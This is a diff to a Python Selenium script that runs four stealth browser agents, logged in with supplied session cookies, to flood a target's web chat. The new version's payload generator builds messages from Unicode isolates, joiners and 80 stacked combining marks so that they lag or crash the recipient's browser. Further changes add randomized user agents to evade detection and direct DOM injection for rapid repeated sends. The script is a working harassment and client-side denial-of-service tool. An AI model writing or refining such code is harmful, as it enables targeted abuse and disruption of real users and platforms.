@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (ENTROPY-STORM V77)
-# 📅 STATUS: RAM-FRAGMENTATION-ACTIVE | 4-AGENT TOTAL | AWS-HARD-KILL
+# 🚀 PROJECT: PRAVEER.OWNS (RAPID-NATIVE V81)
+# 📅 STATUS: QUAD-VELOCITY-ACTIVE | 4-AGENT TOTAL | AWS-HARD-KILL
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -9,34 +9,37 @@ from selenium_stealth import stealth
 from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.options import Options
 
-# --- ⚡ VELOCITY & KILL CONFIG ---
+# --- ⚡ QUAD-VELOCITY CONFIG ---
 AGENTS_PER_MACHINE = 4             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.01, 0.05)  # 🔥 MAXIMUM PACKET VELOCITY
-REST_AFTER_STRIKES = 300   
+BURST_SPEED = (0.01, 0.08)  # 🔥 High-Frequency Delivery
+REST_AFTER_STRIKES = 500   
 REST_DURATION = 1          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_entropy_storm_payload():
-    """Generates unique, high-entropy data to shatter browser memory management."""
+def get_rapid_shaping_payload():
+    """Generates a high-speed payload that is mathematically heavy to render."""
     u_id = random.randint(1000, 9999)
-    # High-plane characters (4 bytes) that force unique memory allocation
-    # 𒀱 = Cuneiform | ﷽ = Wide Ligature | 𒈙 = Complexity
-    heavy_pool = ["𒀱", "﷽", "𒈙", "𒈓", "𒈔", "🌙", "👑", "𝕻", "𝕬", "𝕰", "𝕽"]
+    # \u2068 = FSI | \u2069 = PDI (Isolates)
+    # \u034F = CGJ (Combining Grapheme Joiner)
+    fsi, pdi, cgj = "\u2068", "\u2069", "\u034F"
+    # 80 Stacking marks (Sweet spot for speed vs lag)
+    marks = "".join([chr(i) for i in range(0x0300, 0x0350)]) 
     glue = "\u2060" # Word Joiner
     
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [STORM_ID:{u_id}]"
+    header = f"👑 PRAVEER PAPA 👑 SYSTEM [{u_id}]"
+    error_msg = f"ERROR: DEVEL HAS BEEN OWNED"
     
     body = []
-    # 450 lines of unique, non-compressible memory blocks
-    for i in range(450):
-        # Shuffling ensures the browser cannot 'intern' the string.
-        # Every message is a fresh 10KB memory allocation.
-        random.shuffle(heavy_pool)
-        line = f"PRAVEER PAPA {''.join(heavy_pool * 5)} {i}{glue*4}"
+    # 250 lines - Optimized for instant socket delivery
+    for i in range(250):
+        # We nest the error message in a shaping cluster
+        # This makes it look like standard text but lag like a nuclear block
+        nest = f"{fsi}P{marks}{cgj}R{marks}{cgj}A{marks}{cgj}V{marks}{cgj}EER{pdi}"
+        line = f"{nest} {error_msg} 🌙 {i}"
         body.append(line)
         
     return f"{header}\n{glue.join(body)}".strip()[:9998]
@@ -50,6 +53,7 @@ def get_driver(agent_id):
         chrome_options.add_argument("--disable-gpu")
         chrome_options.binary_location = "/usr/bin/google-chrome"
         
+        # Randomized UA to stay safe
         ua = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/14{random.randint(0,9)}.0.0.0 Safari/537.36"
         chrome_options.add_argument(f"user-agent={ua}")
         
@@ -58,7 +62,7 @@ def get_driver(agent_id):
         return driver
 
 def atomic_dispatch_send(driver, text):
-    """Direct DOM injection that bypasses UI thread priority queues."""
+    """Direct DOM injection bypassing the UI priority queue."""
     try:
         driver.execute_script("""
             var box = document.querySelector('div[role="textbox"], textarea');
@@ -89,13 +93,13 @@ def run_life_cycle(agent_id, cookie, target):
             
             strike_count = 0
             while True:
-                payload = get_entropy_storm_payload()
+                payload = get_rapid_shaping_payload()
                 if atomic_dispatch_send(driver, payload):
                     strike_count += 1
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Storm-Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Rapid-Strike ({GLOBAL_SENT})")
                     
                     if strike_count % 100 == 0:
                         driver.refresh()
